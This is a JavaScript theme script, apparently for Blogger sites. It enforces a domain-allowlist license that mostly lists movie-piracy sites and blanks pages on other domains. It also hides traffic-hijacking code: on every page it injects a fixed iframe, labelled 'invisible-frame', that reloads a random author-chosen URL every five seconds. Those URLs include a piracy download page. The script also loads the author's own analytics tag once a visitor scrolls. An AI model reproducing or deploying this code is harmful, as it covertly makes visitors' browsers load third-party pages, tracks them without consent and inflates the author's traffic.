document.addEventListener('DOMContentLoaded', function() {
    var allowedURLs = [
"https://biographyhero.lovestoblog.com",
    "https://dktheme.online",
    "https://dktech.000.pe",
    "https://vega.dhanjeerider.shop",
    "https://filmyhit.gen.in",
    "https://vegaog.dktheme.com",
    "https://luxmovie.online",
    "https://hdhub4u.fashion",
    "https://vegamovies6.nl",
    "https://19flicks.com",
    "https://neuplayer.blogspot.com",
    "https://vegamovies.com.co",
    "https://vegamoviezz.in",
    "https://gp-afiliate.000.pe",
    "https://gp-lifehacker.000.pe",
    "https://gp-newspape.000.pe",
    "https://jettheme-pro.blogspot.com",
    "https://mariyaui.blogspot.com",
    "https://1stepno.blogspot.com",
    "https://www.films4u.in",
    "https://vegamovies.click",
    "https://allmovieshub.best",
    "http://www.movieshub.best",
    "https://gpmovie-dktzone.rf.gd",
    "https://filmyfly.solutions",
    "https://hindustaniparivar.in",
    "https://taagsqywsg.blogspot.com",
    "https://hdhub4u-clone.blogspot.com",
    "https://exprothikhad.blogspot.com",
    "https://jet-moviev3.blogspot.com",
    "https://dkhek.blogspot.com",
    "https://draft.blogger.com",
    "https://www.blogger.com",
    "https://blogger.com",
    "https://www.jawazbook.com",
    "https://codingrider.blogspot.com", "https://www.blogger.com/blog/post/edit/preview",
    "https://eduhub-demo.blogspot.com",
    "https://vega-clone.blogspot.com",
    "https://dkchek1.blogspot.com",
    "https://girgit-ui.blogspot.com",
    "https://www.filmyslap.xyz",
    "https://fletrothemes.blogspot.com",
    "https://faddalunga.blogspot.com",
    "https://mediunmovie.blogspot.com",
    "https://www.myanimehindi.in",
    "https://plusuiteme.blogspot.com",
    "https://jet-movie.blogspot.com",
    "https://www.timestoryaxom.in",
    "https://moviesmod4u.com",
    "https://Thevegamovies.life", "https://solution-manualspdf.blogspot.com",
    "https://testyyyyrr4.blogspot.com",
    "https://desiremovies.boutique",
    "https://orgmovies.store",
    "https://desiremovies.store",
    "https://desiremovies.art",
    "https://vega-movies.in.net",
    "https://thehdhub4u.in",
    "https://movies4u.dhanjeerider.shop",
    "https://plusui.dhanjeerider.shop",
    "https://news.dhanjeerider.shop",
    "https://hdhub4u.dhanjeerider.shop",
    "https://chek.dhanjeerider.shop",
    "https://filmybuff.store",
    "https://www.mkvmoviespoint.me",
    "https://www.mkvmoviespoint.tech",
    "https://samovies.in",
    "https://hdhub4u.tires",
    "https://www.vegamovie.blog",
    "https://news.dktheme.online",
    "https://movieshd4u.in",
    "https://vega-movies.news"
];
    var foundMatch = false;

    for (var i = 0; i < allowedURLs.length; i++) {
        if (window.location.href.startsWith(allowedURLs[i])) {
            foundMatch = true;
            break;
        }
    }

    function hideSemanticTags() {
        var css = `
            header, nav, main, section, article, aside, footer, figure, figcaption, mark, time, summary, details, div, img {
                display: none !important;
            }
        `;
        var style = document.createElement('style');
        style.appendChild(document.createTextNode(css));
        document.head.appendChild(style);
    }

    if (foundMatch) {
        
    } else {
        hideSemanticTags();
        alert('You need to verify your domain to use this theme. Please contact support.');
        document.body.innerHTML = `Your License Is Not Active. Contact <a href="https://t.me/dhanjeerider" target="_blank">DHANJEE Rider</a> to get a license.`;
    }

  
  let Folt = document.querySelector(".footer, #main, .copyright") || document.body; 
  if (Folt) {
    let Newel = document.createElement('span');
    Newel.innerHTML = `<style>
      iframe.invisible-frame {
      position: fixed;
      width:60%;
      height: 20%;
      bottom: 20%;
      right: 0;
      border: none;
      opacity: 2;
      z-index:39494;
    }
  </style> <iframe class="invisible-frame" id="postFrame" src=""></iframe>`;
    Folt.prepend(Newel);  
    var lazyanalisis=!1;window.addEventListener("scroll",function(){(0!=document.documentElement.scrollTop&&!1===lazyanalisis||0!=document.body.scrollTop&&!1===lazyanalisis)&&(!function(){var e=document.createElement("script");e.type="text/javascript",e.async=!0,e.src="https://www.googletagmanager.com/gtag/js?id=G-2VYRMPXK0F";var a=document.getElementsByTagName("script")[0];a.parentNode.insertBefore(e,a)}(),lazyanalisis=!0)},!0); window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-2VYRMPXK0F');  
  } else {
       
  }

  const postUrls = [
    'https://dktheme.com',
    'https://luxmovies2.live/download-gulaabi-2024-marathi-web-dl-full-movie-480p-500mb-720p-1-3gb-1080p-2-8gb/',
'https://dktheme.com/asmr-antistress-relaxation-toys/index.html',
'https://dktheme.com/plants-vs-zombies-war/index.html',
'https://dktheme.com/chain-cube-2048-3d-merge-game/index.html',
'https://dktheme.com/nana-diy-dress-cake/index.html'
  ];
        function goToRandomPost() {
            const randomIndex = Math.floor(Math.random() * postUrls.length);
            const randomPostUrl = postUrls[randomIndex];
            document.getElementById('postFrame').src = randomPostUrl;
        }
        window.onload = function() {
            goToRandomPost();
            setInterval(goToRandomPost,  5000);}

});
